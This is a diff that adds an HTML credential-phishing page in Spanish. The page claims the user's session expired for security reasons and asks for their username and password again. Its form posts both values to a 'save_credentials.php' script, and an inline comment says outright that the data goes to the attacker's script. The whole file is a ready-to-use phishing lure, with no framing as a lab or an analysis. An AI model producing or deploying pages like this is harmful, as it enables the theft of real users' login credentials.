@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+</head>
+<body>
+    <div class="container">
+        <h2>Su sesión ha expirado por seguridad.</h2>
+        <p>Por favor, ingrese sus credenciales nuevamente para continuar.</p>
+        <!-- El formulario envía los datos al script del atacante -->
+        <form action="save_credentials.php" method="POST">
+            <label>Usuario:</label><br>
+            <input type="text" name="username" required><br><br>
+            <label>Contraseña:</label><br>
+            <input type="password" name="password" required><br><br>
+            <button type="submit">Iniciar Sesión</button>
+        </form>
+    </div>
+    
+</body>
+</html>
